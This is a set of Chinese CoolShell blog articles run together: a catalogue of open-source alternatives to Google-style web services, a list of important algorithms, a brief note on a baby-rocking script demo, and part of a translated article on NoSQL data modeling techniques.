* **网页访问量统计** （Google Analytics）     * Piwik，一套基于Php+MySQL技术构建，能够与Google Analytics相媲美的开源网站访问统计系统，前身是phpMyVisites。Piwik可以给你详细的统计信息，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等，并且采用了大量的AJAX/Flash技术，使得在操作上更加便易。此外，它还采用了插件扩展及开放API架构，可以让开发人员根据自已的实际需求创建更多的功能．     * Open Web Analytics，一个开源的网站流量统计系统。基于PHP/Open Flash Chart/Ajax技术开发，既可以单独使用也可以与WordPress、Gallery&MediaWiki集成使用。支持多个网站，集成Google Maps，RSS/Atom订阅跟踪等功能。* **虚拟主机平台** （Google AppEngine）     * AppScale，是一个平台，允许用户发布和托管自己的 Google App Engine 的应用程序。支持 Python, Java, and Go Google App Engine 平台。
* **办公** （Google Docs）     * Zimbra Collaboration Suite，其英文缩写为ZCA。全功能的通信及协作办公应用程序，提供可靠和高效能的邮件、地址簿、效率手册、任务列表以及网络文档制作功能。     * PHPGroupware，功能强大，基于Web的Messaging ，Collaboration和企业管理平台。 _phpGroupWare_ 包含50多个模块可根据你的需求进行搭配与组合。它提供了约50种基于网络的应用，有日历，通讯录，先进的项目经理，待办事项列表，笔记，电子邮件，新闻组和新闻阅读器，一个文件管理器和更多应用。     * OpenGoo,Fengoffice，基于ExtJs+XAMP（Apache、PHP、MySQL）开发的开源web office。它具备了主流在线协作系统所应具备的所有功能，包括任务管理、日程管理、文件管理、联系人管理以及email收发功能。其文件管理模块，实现了文件版本管理的功能，能够方便的查找、下载同一文件的不同版本。适用于任何单位或个人创建，共享，协作维护和发布它们所有内部与外部文档。     * Crabgrass，社会网络，小组协作，网络组织的Web应用程序。它由一组协作工具固体套件，如私人维基，任务列表，文件库，和决策工具。程序目前正在做了大量的用户界面改革，更完善的社会网络工具，博客和活动日程，以及更好的协作和决策制定各独立团体的支持。     * Etherpad，由两位Google 前员工所开发，已被Google 收购成为开放原始码项目。主要功能是让多个使用者透过网路来共同编辑一份文件，与先前介绍过的Sync.in 好用的线上即时文件协作平台类似。EtherPad 无须注册就能使用，建立文件后会产生一个网址，其它用户可以透过该网址与你编辑同一份文件，并标记出不同用户所编辑的位置，也有提供汇入汇出及时间轴等功能。
#### Groupware群件* **Webmail** (gmail, hotmail)     * Zimbra，强大的开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。它最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。     * Roundcube，支持多国语言的IMAP客户端，操作界面看起像一个桌面应用程序。它提供一个e-mail客户端应该具备的所有功能包括MIME支持,地址薄，文件夹操作，信息搜索和拼写检查。RoundCube Webmail采用PHP+Ajax开发并且需要MySQL数据库来存储数据。 用户界面采用XHTML+CSS2设计。     * conjoon，基于Ext JS+PHP/MySQL开发的Webmail和RSS客户端阅读器。此外还包含一个联系人管理模块。     * Tdah，一个PHP Webmail系统。该系统采用POP3协议收邮件，可以配置使用SMTP、PHP mail、Sendmail或Qmail来发送邮件。T-dah还包含以下几个模块：事件日历、群组聊天、文件夹管理、邮件搜索等。T-dah使用 TinyMCE WYSIWYG编辑器来创建新邮件。     * Funambol，世界领先的开源云同步和PUSHMAIL工具，支持诸多手提移动设备，包括苹果、黑莓、Android、Windows Mobile、索爱、三星、诺基亚等20余款。     * Hastymail，一个使用方便快捷、安全，跨平台的IMAP/SMTP客户端。采用PHP语言编写，运行于PHP+MYSQL平台环境。提供一个简洁的Web界面来发送和读取E-mail。     * Xuheki，一个很快的IMAP 使用AJAX 技术开发的客户端。你能想到的功能它基本上都有了。     * Claros，一个比较简单的，采用pop3/smtp收发邮件的 _webMail_ 系统。不需要数据库的支持。提供一个独立于SMTP服务器的垃圾邮件过滤机制。
* **Email 服务器** （MS Exchange）     * Archiveopteryx，一个互联网归档邮件服务器，支持强大的归档功能。可以运行在Linux, FreeBSD, NetBSD, OpenBSD 和 Mac OS X。     * Roundcube，提供一个e-mail客户端应该具备的所有功能包括MIME支持,地址薄，文件夹操作，信息搜索和拼写检查。RoundCube Webmail采用PHP+Ajax开发并且需要MySQL数据库来存储数据。 用户界面采用XHTML+CSS2设计。     * Squirrelmail，一款由PHP语言编写，基于标准的webmail软件包。它包括内建的纯PHP支持的IMAP和SMTP协议，所生成的页面绝对支持HTML4.0标准(无需JavaScript支持)，这样可以运行在更多的平台和更多的浏览器上。它的系统安装要求非常低，但是非常容易安装和配置。SquirrelMail拥有你的客户端邮件程序所拥有的一切，比如增强型的MIME支持、地址薄、文件夹操作等等功能。     * Horde Groupware Suite，一个强大的邮件办公套件。
* **邮件列表** （Google Groups, Yahoo Groups）     * Freelists     * Mailman，管理电子信箱讨论和自由软件电子通讯清单。 支持内置的归档，自动退回处理，内容过滤，消化交货，垃圾邮件过滤器等。* **论坛** （vBulletin）（注：国内的主要是用Discuz!）     * phpBB，中文的在这里http://www.phpbbchina.com     * Phorum，基于PHP+MySQL开发的开源论坛项目。它的特点是速度快，功能强大，面向模块化设计，安装简单。此外Phorum还集成电子报。     * Vanilla，是很多外国牛人都在用的一款开源论坛程序，它不像我们熟知的phpBB之类的或是类似我国discuz，phpwind的模式，而是采取了全新的内核和界面，界面类似于stackflow，所以用它来做一个社交性的问答网站也是个不错的选择。     * Ospo，是一项开源社交门户站点方案。它拥有标准功能（添加、删除好友，前十排行榜），论坛整合、音乐模块（带有艺术家目录的专辑和歌曲）、广播心情整合、日志（添加、删除、修改、检查）等等众多功能。
* **日历** （cf, 30boxes, Google calendars, ScheduleWorld）     * Zimbra Collaboration Suite，功能的通信及协作办公应用程序，提供可靠和高效能的邮件、地址簿、效率手册、任务列表以及网络文档制作功能。     * Web Calendar，一款漂亮的Flash日历，可以添加在网页上，它可以高亮显示事件，会议，节假日的日期。     * Funambol，世界领先的开源云同步和PUSHMAIL工具，支持诸多手提移动设备，包括苹果、黑莓、Android、Windows Mobile、索爱、三星、诺基亚等20余款。     * Joyent Connector，免费提供Office 2.0的功能，如团队电子邮件、日程安排、相互联系、文档和书签。     * Horde Groupware Suite，协同办公套件。* **会议和评审管理**     * Openconf，开源的会议管理系统，主要提供以下功能：电子提交、评审、论文答辩，以及会议主席对整个过程的管理等。     * MyReview，学术会议的论文提交和论文评审。     * EasyChair，会议管理系统。     * CyberChair，论文提交和评审系统。     * iChair，会议系统，支持论文提交，评审，讨论等。     * Indico，会议计划，组织，支持从简单到复杂的会议。     * ICEcore，开放团队合作软件使用社交联网统一团队工作空间、实时网络会议、项目管理、实践团体以及远程操作。
* **反馈** （Pollmonkey, Google Forms）     * Limesurvey，前身为PHPSurveyor）是一款在线问卷调查程序，它用PHP语言编写并可以使用MySQL，PostgreSQL或者MSSQL等多种数据库，它集成了调查程序开发、调查问卷的发布以及数据收集等功能，使用它，用户不必了解这些功能的编程细节。* **其它**     * AROUNDMe，可以创建像Ning, Myspace, Yahoo or Google groups一样的合作网站。每个群组可以创建多个网页，网页上包括留言簿、博客、论坛、维基百科等功能。每个群组还可以通过xHTML, CSS, JavaScript and PHP来进行自定义。     * InteractOLE，是一款网络学习的递交和支持平台。与其他在线学习平台不同，InteractOLE致力于教学与学习的社交和互动方面，而不是向学生们学习内容的提供。#### 纯Web 2.0服务* **Feed操作** （Yahoo Pipes）     * Deri Pipes，像Yahoo Pipes一样，可视化的在线编程工具，它是一个用于过滤、转换和聚合网页内容的服务。
* **Feed 聚合** （Bloglines, Google Reader）     * Newsblur，像Google Reader一样的一个RSS在线阅读器。     * rsslounge，基于PHP+MySQL开发的RSS供稿阅读器。可以分类，过滤供稿，设置优先权。除标准的供稿项目之外，还支持图片/照片。     * Tiny Tiny RSS，基于Web的RSS/Atom新闻聚合器。它的UI基于Ajax技术开发所以看起非常像一个桌面应用程序。     * Lilina，一个开源的RSS新闻聚合器实现，功能强大，方便易用，而且最大的好处是不需要数据库支持。     * OpenWebReader，多用户的RSS聚合阅读。     * Gregarius，RSS/RDF/ATOM新闻聚合器支持OPML导入/导出，XHTML/CSS输出。它包含一个基于Ajax的itemtagging系统。     * Cheetah News，利用AJAX技术构建的RSS阅读器，完美支持中文。     * Memephage，是一种自动化网络日志。它能搜集并总结从不同地方收集来的连接，目前是从IRC, 社交MUD，邮件和浏览器中搜集，并使用POE多任务处理和网络框架。     * Ozcode，是Ozmozr.com背后的源代码, 一个微型RSS聚合器，可以进行网络社交、信息分享、身份聚合与展示的网站。
* **社区聚合** （FriendFeed）     * Identi.ca，一个新的微网志服务, 其实现在微博服务真的是很多了, 不过这个比较特别一点的是, identi.ca 用PHP 开发, 可以用jabber/GTalk, 也可以用openid 来登录，主要的是，其是开源项目。     * Noserub，提供的建站程序，可以创建属于你的微型门户，包括 Blog、网络摘录、图片分享、视频、Twitter 等等的，都可以罗列出来，并且通过 RSS 实时更新内容，你的朋友们可以方便的获知你在网络里经常去哪里，最近在关注一些什么，做些什么，想些什么。* **社区新闻** （digg）     * Meneame，程序是类似Digg的西班牙程序，网址是     * Pligg，最灵活的类似Digg的Web2.0 CMS系统！网页设计师可以使用 _Pligg_ 做他(她)想做的任何事情。稍微懂一些PHP和Mysql的知识即可安装 _Pligg_ 。     * Drigg，基于Drupal 构建的PHP的Digg网站系统。     * Reddit，其源码和文档在这里：     * CommunityNews，通过使用社交书签和贝叶斯定理技术向博客定期提供记录。用户可以通过投票支持或反对RSS来源以支持那些受欢迎的资源。     * NewsCloud，是一款基于NewsCloud.com专为平民新闻业和社会新闻网络设计的开源传媒平台。     * Jamss，是基于Digg.com的社交新闻网站, 其通过PHP/MySQL运行。.Jamss 考虑到了行内意见和网络文章的评论，还可以灵活适应多种主题。
* **社区网络** （Facebook, Twitter）     * Friendika，一个由PHP+MySQL的免费应用程式(Open Source)，提供使用者一个单一的界面来控制社群网路服务。支援的社群网路应用服务包括Facebook，Twitter、WordPress、Blogger、Identi.ca、RSS订阅与电子邮件等等的整合服务。     * Diaspora，让你将您的关系分成多个视图（Google+的圈子），每个视图是您生活的不同部分。这是Diaspora首创，用来确保您的照片、经历和笑话，只与您所希望分享的人分享。     * Buddypress，是 WordPress 母公司的一个全新的开源程序，BuddyPress 从本质上说其实是 WordPress 的插件。BuddyPress 把 WordPress的关注点从博客转移到了社区。当然，用户还是能够使用WordPress的所有的博客功能，只是当用户使用 BuddyPress 时，第一要做的是创建他们个人档案，第二才是写博客。     * GNU Social，GNU的SNS。     * Elgg，一款免费开源的社会性网络脚本程序(php/mysql)，以BLOG为中心实现社会网络化，从社会性来讲：Elgg以兴趣为核心的社交平台。它包括网络日志、资料存储、RSS集合、个人档案、FOAF功能等等。     * SocialEngine，是一款由PHP和Zend控制的网络软件，其脚本让你可以轻松地创建属于你自己社交网站或是在线社区，包括自定义群组、相册、消息、用户档案、视频、新闻订阅，拖放群集邮箱服务器等等功能。     * iSocial，是一款免费社交网络脚本平台，你可以用它建立像Friendster和Orkut那样可以一键使用书签，约会和建立群组的社交网站。     * Mahara，有着电子档案、网络日志、简历编辑工具、联系用户的社交网络系统以及建立在线社区的齐全功能。     * The PeopleAggregator，是全新一代的社交网站系统，它力求应用开放的标准、密切的网络互动和强大的灵活性。     * Appleseed，是一款类似Friendster的社交网站软件。网站运行appleseed将互通，形成Appleseed的社交网站。该软件发展的重点是对隐私和安全，以及易用的配置。     * Mugshot，则通过一系列的WEB CRM、照片、日志等等让你时刻了解朋友们的最新动态。     * Clonesumating，是CONSUMATING.COM代码的开源版本， 其功能有用户档案、用户标签、配对并发现古怪标签合并、团队活动（比如每周照片评选、博客问答）、事件日历、PSS订阅等等。     * BeWelcom Rox，是www.bewelcome.org等其他社交网站的运作平台，它将人们真实地聚集了在一起。在那里人们了解全球村庄以及其他文化，分享自己的所在地，组织旅游，写旅游博客等等。     * OpenPNE，是由PHP写成的网络社交服务引擎，其功能有好友管理、好友邀请、日记、博客、订收件箱等等。     * WorldSpace，是一款用户可拓展的共享虚拟空间，它致力于成为新一代的社交网络系统。     * Zoints，这一款软件熟知在线社区是互联网中最重要的一部分，它所正是为帮助解决论坛版主所面临的三大问题（即获得会员，保留会员和盈利）而设计的。
* **社区书签** （Delicious）     * Scuttle，开源Web书签系统，允许多个用户在线存储，共享和Tag他们喜欢的链接。     * Semantic Scuttle，是一款基于Scuttle的社交书签工具。它可以试验像层次化标签、合作描述、OpenID认证这样的全新功能。     * Sabros.us，一个基于互联网的书签系统。它与del.icio.us 是相似，您能在网上处理您的书签, 或者自己建立一个网站。     * Connotea，是 NGP(Nature Publishing Group) 旗下的网站，借鉴当前流行的 del.icio.us 等社会书签的创意，专注于科研领域，并可导入桌面文献管理软件的数据，是当前比较流行的一款在线文献管理工具。     * Pressmark     * Shiftspace，让你的Wordpress成为像 del.icio.us, sabros.us这样的站点。     * Ma.gnolia 2，基于Ruby开发。它的界面比较漂亮，但速度比较慢，另外搜索仅限于tag。     * Akarru，是一款用来建立像www.blogmemes.com网站的社交书签引擎。用户可以通过投票系统在首页上张贴链接并推销链接。     *  Monkey Chow，是一款带有社交书签、主题文章、来源标签、OPML、文章搜索、编辑来源属性等等众多功能的新闻聚合浏览器。     * Feed Me Links，可以将你的书签存储在网上以便随时随地使用，输入你最喜爱的网址并和好友们分享，加标签来管理不同链接，还有更多新鲜事物等待你来发现。
* **短网址服务** （TinyURL）     * tinyULL，不是tinyURL，别看错了。#### 身份和安全* **域名**     * Namecoin/.bit，基于bitcoin技术的分散、开放DNS系统。.bit域名到底靠不靠谱啊，是不是有P2P网络存在，.bit网站就能永远访问？会不会被墙？我们不得而之。     * Social DNS     * Distributed DNS* **身份凭证**     * OpenID，一个去中心化的网上身份认证系统。对于支持OpenID的网站，用户不需要记住像用户名和密码这样的传统验证标记。取而代之的是，他们只需要预先在一个作为OpenID身份提供者（identity provider, IdP）的网站上注册。OpenID是去中心化的，任何网站都可以使用OpenID来作为用户登录的一种方式，任何网站也都可以作为OpenID身份提供者。OpenID既解决了问题而又不需要依赖于中心性的网站来确认数字身份。OpenID正在被越来越多的大网站采用     * OAuth，（开放授权）是一个开放标准，允许用户让第三方应用访问该用户在某一网站上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。
* **加密**     * CACert，想给自己申请一份电子邮件证书或者给自己的网站、服务器申请一个SSL证书是很不容易的，你每年都得给CA（证书颁发验证组织）缴纳不少的证书申请费。有了CAcert，国外一个免费的数字证书颁发组织，你可以免费注册成为用户，申领个人证书和服务器证书等。证书被各种浏览器、邮件客户端所支持。#### 其它* **翻译** （Google Translator）     * Apertium，一个机器翻译平台，由西班牙政府和加泰罗尼亚自治政府拨款支持阿利坎特大学开发。* **桌面** （iGoogle, netbives）     * EyeOS，一款web桌面环境, 俗称Web Operating System (Web OS)或者Web Office. eyeOS是一个开源的软件, 用户可以自由下载或者在eyeOS的服务器 eyeOS server 上使用. 基本的系统附带一些办公软件和 PIM 应用, 并且在官方http://eyeos.org可以找到完整的程序代码。其开发哲学是：Taking Your Life Everywhere!     * CorneliOS，一款运行在服务器端、基于网络的网络虚拟操作系统，本身通过HTML和（或）XHTML为用户提供各种服务，这也就意味着用户只需要使用普通浏览器即可连接并使用这款操作系统。非常类似 eyeOS。
* **3D库** （Google SketchUp 3D Warehouse, Google O3D API）     * Mozilla Canvas 3D，OpenGL 3D Web。     * Web KML Viewer。**参考*** Wikipedia   * 搭建你自己的社交网络：开源社交网络程序集合# 一些重要的算法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一些比较重要的算法，原文罗列了32个，但我觉得有很多是数论里的，和计算机的不相干，所以没有选取。下面的这些，有的我们经常在用，有的基本不用。有的很常见，有的很偏。不过了解一下也是好事。也欢迎你留下你觉得有意义的算法。（注：本篇文章并非翻译，其中的算法描述大部份摘自Wikipedia，因为维基百科描述的很专业了）1. **A*搜寻算法**   俗称A星算法。这是一种在图形平面上，有多个节点的路径，求出最低通过成本的算法。常用于游戏中的NPC的移动计算，或线上游戏的BOT的移动计算上。该算法像Dijkstra算法一样，可以找到一条最短路径；也像BFS一样，进行启发式的搜索。
2. **Beam Search**   束搜索(beam search) 方法是解决优化问题的一种启发式方法,它是在分枝定界方法基础上发展起来的,它使用启发式方法估计k 个最好的路径,仅从这k 个路径出发向下搜索,即每一层只有满意的结点会被保留,其它的结点则被永久抛弃,从而比分枝定界法能大大节省运行时间。束搜索于20 世纪70 年代中期首先被应用于人工智能领域,1976 年Lowerre 在其称为HARPY的语音识别系统中第一次使用了束搜索方法,他的目标是并行地搜索几个潜在的最优决策路径以减少回溯,并快速地获得一个解。3. **二分取中查找算法**   一种在有序数组中查找某一特定元素的搜索算法。搜素过程从数组的中间元素开始，如果中间元素正好是要查找的元素，则搜素过程结束；如果某一特定元素大于或者小于中间元素，则在数组大于或小于中间元素的那一半中查找，而且跟开始一样从中间元素开始比较。这种搜索算法每一次比较都使搜索范围缩小一半。4. **Branch and bound**   分支定界 (branch and bound) 算法是一种在问题的解空间树上搜索问题的解的方法。但与回溯算法不同，分支定界算法采用广度优先或最小耗费优先的方法搜索解空间树，并且，在分支定界算法中，每一个活结点只有一次机会成为扩展结点。
5. **数据压缩**   数据压缩是通过减少计算机中所存储数据或者通信传播中数据的冗余度，达到增大数据密度，最终使数据的存储空间减少的技术。数据压缩在文件存储和分布式系统领域有着十分广泛的应用。数据压缩也代表着尺寸媒介容量的增大和网络带宽的扩展。6. **Diffie–Hellman密钥协商**   Diffie–Hellman key exchange，简称“D–H”， 是一种安全协议。它可以让双方在完全没有对方任何预先信息的条件下通过不安全信道建立起一个密钥。这个密钥可以在后续的通讯中作为对称密钥来加密通讯内容。7. **Dijkstra’s 算法**   迪科斯彻算法（Dijkstra）是由荷兰计算机科学家艾兹格·迪科斯彻（Edsger Wybe Dijkstra）发明的。算法解决的是有向图中单个源点到其他顶点的最短路径问题。举例来说，如果图中的顶点表示城市，而边上的权重表示著城市间开车行经的距离，迪科斯彻算法可以用来找到两个城市之间的最短路径。8. **动态规划**   动态规划是一种在数学和计算机科学中使用的，用于求解包含重叠子问题的最优化问题的方法。其基本思想是，将原问题分解为相似的子问题，在求解的过程中通过子问题的解求出原问题的解。动态规划的思想是多种算法的基础，被广泛应用于计算机科学和工程领域。比较著名的应用实例有：求解最短路径问题，背包问题，项目管理，网络流优化等。这里也有一篇文章说得比较详细。
9. **欧几里得算法**   在数学中，辗转相除法，又称欧几里得算法，是求最大公约数的算法。辗转相除法首次出现于欧几里得的《几何原本》（第VII卷，命题i和ii）中，而在中国则可以追溯至东汉出现的《九章算术》。10. **最大期望（EM）算法**   在统计计算中，最大期望（EM）算法是在概率（probabilistic）模型中寻找参数最大似然估计的算法，其中概率模型依赖于无法观测的隐藏变量（Latent Variable）。最大期望经常用在机器学习和计算机视觉的数据聚类（Data Clustering）领域。最大期望算法经过两个步骤交替进行计算，第一步是计算期望（E），利用对隐藏变量的现有估计值，计算其最大似然估计值；第二步是最大化（M），最大化在 E 步上求得的最大似然值来计算参数的值。M 步上找到的参数估计值被用于下一个 E 步计算中，这个过程不断交替进行。11. **快速傅里叶变换** **(FFT)**   快速傅里叶变换（Fast Fourier Transform，FFT），是离散傅里叶变换的快速算法，也可用于计算离散傅里叶变换的逆变换。快速傅里叶变换有广泛的应用，如数字信号处理、计算大整数乘法、求解偏微分方程等等。本条目只描述各种快速算法，对于离散傅里叶变换的性质和应用，请参见离散傅里叶变换。
12. **哈希函数**   Hash Function是一种从任何一种数据中创建小的数字“指纹”的方法。该函数将数据打乱混合，重新创建一个叫做散列值的指纹。散列值通常用来代表一个短的随机字母和数字组成的字符串。好的散列函数在输入域中很少出现散列冲突。在散列表和数据处理中，不抑制冲突来区别数据，会使得数据库记录更难找到。13. **堆排序**   **Heapsort** 是指利用堆积树 "堆 \(数据结构\)")（堆 "堆 \(数据结构\)")）这种数据结构所设计的一种排序算法。堆积树是一个近似完全二叉树的结构，并同时满足 _堆积属性_ ：即子结点的键值或索引总是小于（或者大于）它的父结点。14. **归并排序**   **Merge sort** 是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。15. **RANSAC 算法**   RANSAC 是”RANdom SAmple Consensus”的缩写。该算法是用于从一组观测数据中估计数学模型参数的迭代方法，由Fischler and Bolles在1981 提出，它是一种非确定性算法，因为它只能以一定的概率得到合理的结果，随着迭代次数的增加，这种概率是增加的。 该算法的基本假设是观测数据集中存在”inliers”（那些对模型参数估计起到支持作用的点）和”outliers”（不符合模型的点），并且这组观测数据受到噪声影响。RANSAC 假设给定一组”inliers”数据就能够得到最优的符合这组点的模型。
16. **RSA加密演算法**   这是一个公钥加密算法，也是世界上第一个适合用来做签名的算法。今天的RSA已经专利失效，其被广泛地用于电子商务加密，大家都相信，只要密钥足够长，这个算法就会是安全的17. **并查集Union-find**   并查集是一种树型的数据结构，用于处理一些不相交集合（Disjoint Sets）的合并及查询问题。常常在使用中以森林来表示。18. **Viterbi algorithm**   寻找最可能的隐藏状态序列(Finding most probable sequence of hidden states)**附录*** 关于这个世界上的算法，你可以看看Wikipedia的这个网页：http://en.wikipedia.org/wiki/List_of_algorithms   * 关于排序算法，你可以看看本站的这几篇文章《一个显示排序过程的Python脚本》、《一个排序算法比较的网站》。# 用脚本实现哄宝宝睡觉(Demo)作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn去年，本站发布了一篇文章《用脚本哄宝宝睡觉》，具体想法是把摇篮和光驱连一起，然后用脚本把光驱弹出和收入以实现驱动摇篮。今天在网上看到一个具体实现，呵呵。看下面的视频：
# NoSQL 数据建模技术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn全文译自墙外文章“NoSQL Data Modeling Techniques”，译得不好，还请见谅。这篇文章看完之后，你可能会对NoSQL的数据结构会有些感觉。我的感觉是，关系型数据库想把一致性，完整性，索引，CRUD都干好，NoSQL只干某一种事，但是牺牲了很多别的东西。总体来说，我觉得NoSQL更适合做Cache。下面是正文——NoSQL 数据库经常被用作很多非功能性的地方，如，扩展性，性能和一致性的地方。这些NoSQL的特性在理论和实践中都正在被大众广泛地研究着，研究的热点正是那些和性能分布式相关的非功能性的东西，我们都知道 CAP 理论被很好地应用于了 NoSQL 系统中（陈皓注：CAP即，一致性(Consistency)， 可用性(Availability)， 分区容忍性(Partition tolerance)，在分布式系统中，这三个要素最多只能同时实现两个，而NoSQL一般放弃的是一致性）。但在另一方面，NoSQL的数据建模技术却因为缺乏像关系型数据库那样的基础理论没有被世人很好地研究。这篇文章从数据建模方面对NoSQL家族进行了比较，并讨论几个常见的数据建模技术。
要开始讨论数据建模技术，我们不得不或多或少地先系统地看一下NoSQL数据模型的成长的趋势，以此我们可以了解一些他们内在的联系。下图是NoSQL家族的进化图，我们可以看到这样的进化：Key- Value时代，BigTable时代，Document时代，全文搜索时代，和Graph数据库时代：（陈皓注：注意图中SQL说的那句话，NoSQL再这样发展下去就是SQL了，哈哈。）!   NoSQL Data Models首先，我们需要注意的是SQL和关系型数据模型已存在了很长的时间，这种面向用户的自然性意味着：* 最终用户一般更感兴趣于数据的聚合显示，而不是分离的数据，这主要通过SQL来完成。   * 我们无法通过人手工控制数据的并发性，完整性，一致性，或是数据类型校验这些东西的。这就是为什么SQL需要在事务，二维表结构（schema）和外表联合上做很多事。另一方面，SQL可以让软件应用程序在很多情况下不需要关心数据库的数据聚合，和数据完整性和有效性进行控制。而如果我们去除了数据一致性，完整性这些东西，会对性能和分布存储有着重的帮助。正因为如此，我们才有数据模型的进化：* **Key-Value 键值对存储** 是非常简单而强大的。下面的很多技术基本上都是基于这个技术开始发展的。但是，Key-Value有一个非常致命的问题，那就是如果我们需要查找一段范围内的key。（陈皓注：学过hash-table数据结构的人都应该知道，hash-table是非序列容器，其并不像数组，链接，队列这些有序容器，我们可以控制数据存储的顺序）。于是，有序键值 （Ordered Key-Value） 数据模型被设计出来解决这一限制，来从根本上提高数据集的问题。
* **Ordered Key-Value 有序键值** 模型也非常强大，但是，其也没有对Value提供某种数据模型。通常来说，Value的模型可以由应用负责解析和存取。这种很不方便，于是出现了 BigTable类型的数据库，这个数据模型其实就是map里有map，map里再套map，一层一层套下去，也就是层层嵌套的key-value（value里又是一个key-value），这种数据库的Value主要通过“列族”（column families），列，和时间戳来控制版本。（陈皓注：关于时间戳来对数据的版本控制主要是解决数据存储并发问题，也就是所谓的乐观锁，详见《多版本并发控制(MVCC)在分布式系统中的应用在分布式系统中的应用")》）* **Document databases 文档数据库** 改进了 BigTable 模型，并提供了两个有意义的改善。第一个是允许Value中有主观的模式（scheme），而不是map套map。第二个是索引。 **Full Text Search Engines 全文搜索引擎** 可以被看作是文档数据库的一个变种，他们可以提供灵活的可变的数据模式（scheme）以及自动索引。他们之间的不同点主要是，文档数据库用字段名做索引，而全文搜索引擎用字段值做索引。
* **Graph data models 图式数据库** 可以被认为是这个进化过程中从 Ordered Key-Value 数据库发展过来的一个分支。图式数据库允许构建议图结构的数据模型。它和文档数据库有关系的原因是，它的很多实现允许value可以是一个map或是一个document。目录* NoSQL 数据模型摘要   * 概念技术 Conceptual Techniques     * (1) 反规格化 Denormalization     * (2) 聚合 Aggregates     * (3) 应用层联结 Application Side Joins   * 通用建模技术 General Modeling Techniques     * (4) 原子聚合 Atomic Aggregates     * (5) 可枚举键 Enumerable Keys     * (6) 降维 Dimensionality Reduction     * (7) 索引表 Index Table     * (8) 键组合索引 Composite Key Index     * (9) 键组合聚合 Aggregation with Composite Keys     * (10) 反转搜索 Inverted Search – 直接聚合 Direct Aggregation   * 层级式模型 Hierarchy Modeling Techniques     * (11) 树形聚合Tree Aggregation     * (12) 邻接列表 Adjacency Lists     * (13) Materialized Paths     * (14) 嵌套集 Nested Sets   * (15) 嵌套文档扁平化：有限的字段名 Nested Documents Flattening: Numbered Field Names     * (16)嵌套文档扁平化：邻近查询 Nested Documents Flattening: Proximity Queries     * (17) 图结构批处理 Batch Graph Processing   * 参考
####  NoSQL 数据模型摘要本文剩下的章节将向你介绍数据建模的技术实现和相关模式。但是，在介绍这些技术之前，先来一段序言：* NoSQL 数据模型设计一般从业务应用的具体数据查询入手，而不是数据间的关系：     * 关系型的数据模型基本上是分析数据间的结构和关系。其设计理念是： ” **What answers do I have?”** __     * NoSQL 数据模型基本上是从应用对数据的存取方式入手，如：我需要支持某种数据查询。其设计理念是 **”What questions do I have?”*** NoSQL 数据模型设计比关系型数据库需要对数据结构和算法的更深的了解。在这篇文章中我会和大家说那些尽人皆知的数据结构，这些数据结构并不只是被NoSQL使用，但是对于NoSQL的数据模型却非常有帮助。* 数据冗余和反规格化是一等公民。* 关系型数据库对于处理层级数据和图式数据非常的不方便。NoSQL用来解决图式数据明显是一个非常好的解决方案，几乎所有的NoSQL数据库可以很强地解决此类问题。这就是为什么这篇文章专门拿出一章来说明层级数据模型。下面是NoSQL的分类表，也是我用来写这篇文章时做实践的产品：
* Key-Value 存储: Oracle Coherence, Redis, Kyoto Cabinet   * 类BigTable存储: Apache HBase, Apache Cassandra   * 文档数据库: MongoDB, CouchDB   * 全文索引: Apache Lucene, Apache Solr   * 图数据库: neo4j, FlockDB#### 概念技术 Conceptual Techniques这一节主要介绍NoSQL数据模型的基本原则。##### (1) 反规格化 Denormalization反规格化 Denormalization 可以被认为是把相同的数据拷贝到不同的文档或是表中，这样就可以简化和优化查询，或是正好适合用户的某中特别的数据模型。这篇文章中所说的绝大多数技术都或多或少地导向了这一技术。总体来说，反规格化需要权衡下面这些东西：* **_查询数据量 /查询IO_** VS **_总数据量_** 。使用反规格化，一方面可以把一条查询语句所需要的所有数据组合起来放到一个地方存储。这意味着，其它不同不同查询所需要的相同的数据，需要放在别不同的地方。因此，这产生了很多冗余的数据，从而导致了数据量的增大。
* **_处理复杂度_** VS **_总数据量_**. 在符合范式的数据模式上进行表连接的查询，很显然会增加了查询处理的复杂度，尤其对于分布式系统来说更是。反规格化的数据模型允许我们以方便查询的方式来存构造数据结构以简化查询复杂度。**适用性** : Key-Value Store 键值对数据库， Document Databases文档数据库， BigTable风格的数据库。##### (2) 聚合 Aggregates所有类型的NoSQL数据库都会提供灵活的Schema（数据结构，对数据格式的限制）：* Key-Value Stores 和 Graph Databases 基本上来说不会Value的形式，所以Value可以是任意格式。这样一来，这使得我们可以任意组合一个业务实体的keys。比如，我们有一个用户帐号的业务实体，其可以被如下这些key组合起来： _UserID_name, UserID_email, UserID_messages_ 等等。如果一个用户没有email或message，那么相应也不会有这样的记录。* BigTable 模型通过列集合来支持灵活的Schema，我们称之为列族（ _column family_ ）。BigTable还可以在同一记录上出现不同的版本（通过时间戳）。
* Document databases 文档数据库是一种层级式的“去Schema”的存储，虽然有些这样的数据库允许检验需要保存的数据是否满足某种Schema。灵活的Schema允许你可以用一种嵌套式的内部数据方式来存储一组有关联的业务实体（陈皓注：类似于JSON这样的数据封装格式）。这样可以为我们带来两个好处。* 最小化“一对多”关系——可以通过嵌套式的方式来存储实体，这样可以少一些表联结。* 可以让内部技术上的数据存储更接近于业务实体，特别是那种混合式的业务实体。可能存于一个文档集或是一张表中。下图示意了这两种好处。图中描给了电子商务中的商品模型（陈皓注：我记得我在“挑战无处不在”一文中说到过电商中产品分类数据库设计的挑战）* 首先，所有的商品Product都会有一个ID，Price 和 Description。* 然后，我们可以知道不同的类型的商品会有不同的属性。比如，作者是书的属性，长度是牛仔裤的属性。其些属性可能是“一对多”或是“多对多”的关系，如：唱片中的曲目。* 接下来，我们知道，某些业务实体不可能使用固定的类型。如：牛仔裤的属性并不是所有的牌子都有的，而且，有些名牌还会搞非常特别的属性。
